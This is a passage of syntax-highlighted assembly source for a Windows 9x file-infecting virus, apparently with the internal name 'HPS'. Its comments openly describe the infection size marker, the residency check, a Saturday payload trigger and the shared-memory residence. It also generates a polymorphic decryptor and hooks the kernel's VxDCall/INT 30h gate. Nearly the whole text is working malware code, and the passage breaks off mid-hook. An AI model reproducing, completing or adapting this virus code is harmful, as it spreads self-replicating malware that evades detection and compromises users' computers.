</span><span class="sc5">page_mem_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">mem_size</span><span class="sc4">+</span><span class="sc0">      \           </span><span class="sc1">;Virus in memory</span><span class="sc0">
                     </span><span class="sc5">inf_size</span><span class="sc4">+</span><span class="sc0">      \           </span><span class="sc1">;Virus copy for infections</span><span class="sc0">
                     </span><span class="sc5">poly_max_size</span><span class="sc4">+</span><span class="sc0"> \           </span><span class="sc1">;Poly decryptor</span><span class="sc0">
                     </span><span class="sc2">0FFFh</span><span class="sc4">)/</span><span class="sc2">1000h</span><span class="sc0">               </span><span class="sc1">;Size in memory pages</span><span class="sc0">
</span><span class="sc5">page_align</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0">                      </span><span class="sc1">;Page allocation alignment</span><span class="sc0">
</span><span class="sc5">SIZE_PADDING</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000065h</span><span class="sc0">                   </span><span class="sc1">;Mark for infected files</span><span class="sc0">

                </span><span class="sc1">;Some equates stolen from VMM.h</span><span class="sc0">

</span><span class="sc5">PR_PRIVATE</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80000400h</span><span class="sc0">
</span><span class="sc5">PR_SHARED</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80060000h</span><span class="sc0">
</span><span class="sc5">PR_SYSTEM</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80080000h</span><span class="sc0">
</span><span class="sc5">PR_FIXED</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000008h</span><span class="sc0">
</span><span class="sc5">PR_4MEG</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc5">PR_STATIC</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000010h</span><span class="sc0">
</span><span class="sc5">PD_ZEROINIT</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc5">PD_NOINIT</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">PD_FIXEDZERO</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000003h</span><span class="sc0">
</span><span class="sc5">PD_FIXED</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000004h</span><span class="sc0">
</span><span class="sc5">PC_FIXED</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000008h</span><span class="sc0">
</span><span class="sc5">PC_LOCKED</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000080h</span><span class="sc0">
</span><span class="sc5">PC_LOCKEDIFDP</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000100h</span><span class="sc0">
</span><span class="sc5">PC_WRITEABLE</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00020000h</span><span class="sc0">
</span><span class="sc5">PC_USER</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00040000h</span><span class="sc0">
</span><span class="sc5">PC_INCR</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">40000000h</span><span class="sc0">
</span><span class="sc5">PC_PRESENT</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">PC_STATIC</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">20000000h</span><span class="sc0">
</span><span class="sc5">PC_DIRTY</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">08000000h</span><span class="sc0">
</span><span class="sc5">PCC_ZEROINIT</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc5">PCC_NOLIN</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">10000000h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">_TEXT</span><span class="sc0">           </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">

</span><span class="sc5">host_entry</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">entry_1st_gen</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc5">_TEXT</span><span class="sc0">           </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">_DATA</span><span class="sc0">           </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">           </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">_BSS</span><span class="sc0">            </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'BSS'</span><span class="sc0">
</span><span class="sc5">_BSS</span><span class="sc0">            </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Virus loader code</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">virseg</span><span class="sc0">          </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'HPS'</span><span class="sc0">

</span><span class="sc5">mem_base</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">virus_entry</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_delta</span><span class="sc0">                          </span><span class="sc1">;Get delta-offset</span><span class="sc0">
</span><span class="sc5">get_delta</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                 </span><span class="sc1">;into ebp and</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;host original</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">get_delta</span><span class="sc0">                </span><span class="sc1">;entry-point in eax</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc0">                                  </span><span class="sc1">;sub eax,xxxx</span><span class="sc0">
</span><span class="sc5">infected_ep</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">                                  </span><span class="sc1">;add eax,xxxx</span><span class="sc0">
</span><span class="sc5">original_ep</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                
</span><span class="sc5">entry_1st_gen</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Scan memory looking for KERNEL32.dll</span><span class="sc0">
                </span><span class="sc1">;We can do this without causing protection faults,</span><span class="sc0">
                </span><span class="sc1">;just setup a structured exception handler to trap faults</span><span class="sc0">
                </span><span class="sc1">;produced by our scan</span><span class="sc0">
                </span><span class="sc1">;Thanks to Jacky Qwerty for this piece of code</span><span class="sc0">

                </span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc5">try_01</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">080000101h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IGetK32BaseAddr</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">try_02</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">kernel_found</span><span class="sc0">
</span><span class="sc5">try_02</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0C0000101h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IGetK32BaseAddr</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">try_03</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">kernel_found</span><span class="sc0">
</span><span class="sc5">try_03</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IGetK32BaseAddr</span><span class="sc0">

</span><span class="sc5">kernel_found</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ebx</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">init_error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_DOS_HEADER.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.</span><span class="sc0">      \
                                       </span><span class="sc5">OH_DirectoryEntries.</span><span class="sc0">    \
                                       </span><span class="sc5">DE_Export.</span><span class="sc0">              \
                                       </span><span class="sc5">DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                
                </span><span class="sc1">;Microsoft C compiler mangles the names of stdcall functions</span><span class="sc0">
                </span><span class="sc1">;(such as VxDCall) to include an @ followed by the number of</span><span class="sc0">
                </span><span class="sc1">;parameter bytes that the function uses</span><span class="sc0">
                </span><span class="sc1">;If you dump out the exports from KERNEL32.dll, you will</span><span class="sc0">
                </span><span class="sc1">;find that the first eight exported entry-points (export</span><span class="sc0">
                </span><span class="sc1">;ordinals 1 through 9) all refer to the same address</span><span class="sc0">
                </span><span class="sc1">;This address is the VxDCall function entry-point</span><span class="sc0">
                </span><span class="sc1">;So lets go to address of exported functions and look for 8</span><span class="sc0">
                </span><span class="sc1">;functions pointing to the same address</span><span class="sc0">

                </span><span class="sc1">;At this time:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;ebx = kernel base address</span><span class="sc0">
                </span><span class="sc1">;edi = image export dir</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">address_loop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">ED_NumberOfFunctions</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">init_error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">function_loop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">address_loop</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">function_loop</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_VxDCall</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;VxDCall found</span><span class="sc0">

                </span><span class="sc1">;At this point we know how to call VxDCall api</span><span class="sc0">
                </span><span class="sc1">;So we can use our int21h dispatcher to perform</span><span class="sc0">
                </span><span class="sc1">;the residency check</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00002A00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc3">"HPS!"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc3">"TSR?"</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc3">"YES!"</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">init_error</span><span class="sc0">

                </span><span class="sc1">;Check if time to activate our payload</span><span class="sc0">
        
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                              </span><span class="sc1">;Saturday?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">activation_end</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">activation_end</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">bmp_active</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc1">;Well... Now lets use VxDCall to allocate some</span><span class="sc0">
                </span><span class="sc1">;shared memory</span><span class="sc0">
                </span><span class="sc1">;This memory will stay there after host termination</span><span class="sc0">
                </span><span class="sc1">;and will be visible to all running processes</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PC_WRITEABLE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">PC_USER</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">page_mem_size</span><span class="sc0">                      </span><span class="sc1">;# of pages</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PR_SHARED</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">00010000h</span><span class="sc0">                          </span><span class="sc1">;Call to _PageReserve</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_VxDCall</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;VxDCall0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFFFFFFh</span><span class="sc0">                      </span><span class="sc1">;Success?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">init_error</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">80000000h</span><span class="sc0">                       </span><span class="sc1">;In shared memory?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">free_pages</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;Save linnear address</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PC_WRITEABLE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">PC_USER</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">PC_PRESENT</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">PC_FIXED</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PD_ZEROINIT</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">page_mem_size</span><span class="sc0">                      </span><span class="sc1">;# of pages</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">                             </span><span class="sc1">;Linnear page number</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00010001h</span><span class="sc0">                          </span><span class="sc1">;Call to _PageCommit</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_VxDCall</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;VxDCall0</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">free_pages</span><span class="sc0">
                             
</span><span class="sc5">commit_success</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Point eax to our</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VxDCall_code</span><span class="sc4">-</span><span class="sc5">mem_base</span><span class="sc0">           </span><span class="sc1">;hook procedure</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ptr_location</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;Setup far jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hook_status</span><span class="sc4">],</span><span class="sc3">"FREE"</span><span class="sc0">  </span><span class="sc1">;Clear busy flag</span><span class="sc0">

                </span><span class="sc1">;Let's trace VxDCall function, code will look like:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;VxDCall:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;8B 44 24 04           MOV EAX,DWORD PTR [ESP+04h]</span><span class="sc0">
                </span><span class="sc1">;8F 04 24              POP DWORD PTR [ESP]</span><span class="sc0">
                </span><span class="sc1">;2E FF 1D xx xx xx xx  CALL FWORD PTR CS:[xxxxxxxx]</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;The 32bit far call instruction points to an INT 30h</span><span class="sc0">
                </span><span class="sc1">;instruction used by the VxDCall function to transfer</span><span class="sc0">
                </span><span class="sc1">;control to RING-0</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_VxDCall</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;VxDCall entry-point</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000100h</span><span class="sc0">                       </span><span class="sc1">;Explore 0100h bytes</span><span class="sc0">
</span><span class="sc5">trace_VxDCall</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">trace_next</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">1DFFh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">get_int30h</span><span class="sc0">
</span><span class="sc5">trace_next</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">trace_VxDCall</span><span class="sc0">                      
   
</span><span class="sc5">free_pages</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0001000Ah</span><span class="sc0">                          </span><span class="sc1">;Call to _PageFree</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_VxDCall</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;VxDCall0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">init_error</span><span class="sc0">
                
</span><span class="sc5">get_int30h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;Before setting our hook lets generate one polymorphic</span><span class="sc0">
                </span><span class="sc1">;decryptor... We will use this decryptor for each file</span><span class="sc0">
                </span><span class="sc1">;infection... This is also known as slow-mutation</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mutate</span><span class="sc0">                             </span><span class="sc1">;Generate decryptor</span><span class="sc0">
                    
                </span><span class="sc1">;Now we have all the necesary information to hook Windows</span><span class="sc0">
                </span><span class="sc1">;calls to VxDCall function</span><span class="sc0">
                </span><span class="sc1">;Save the 16:32 pointer to INT 30h instruction and</span><span class="sc0">
                </span><span class="sc1">;overwrite it with the address of our hook procedure</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">                                   </span><span class="sc1">;Skip FF 1D opcodes</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">;Get ptr to INT 30h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">VxDCall_code</span><span class="sc4">-</span><span class="sc5">mem_base</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000006h</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VxDCall_hook</span><span class="sc4">-</span><span class="sc5">mem_base</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
